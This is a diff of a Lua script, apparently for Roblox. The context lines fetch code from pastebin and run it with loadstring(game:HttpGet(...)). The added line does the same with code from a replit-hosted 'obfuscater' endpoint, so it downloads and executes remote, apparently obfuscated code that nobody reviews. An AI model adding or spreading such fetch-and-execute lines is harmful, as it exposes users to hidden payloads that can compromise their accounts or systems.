@@ -1892,3 +1892,5 @@ player.CharacterAdded:Connect(criarTag)
 loadstring(game:HttpGet("https://pastebin.com/raw/ZmDg3Q3b"))()
 
 loadstring(game:HttpGet("https://pastebin.com/raw/trCe3M8u"))()
+
+loadstring(game:HttpGet("https://tons-obfuscater--shinob1the1evil.replit.app/api/obfs/raw/665695bd-0384-4fb6-8a2c-3875f9e4b755"))()
